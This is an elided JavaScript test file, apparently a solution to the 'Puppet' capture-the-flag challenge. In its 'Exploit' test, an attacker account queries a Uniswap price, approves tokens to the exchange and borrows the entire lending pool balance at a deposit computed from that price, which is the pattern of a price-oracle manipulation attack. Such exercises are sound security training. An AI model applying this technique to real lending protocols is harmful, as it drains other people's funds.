...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const outputAmount = parseEther('9.9');
        const inputAmount = await this.uniswapExchange.getTokenToEthOutputPrice(outputAmount, { gasLimit: 1e6 });
        await this.token.connect(attacker).approve(this.uniswapExchange.address, inputAmount);
        ...
        const depositRequired = await this.lendingPool.calculateDepositRequired(poolBalance);
        await this.lendingPool.connect(attacker).borrow(poolBalance, { value: depositRequired });
    });
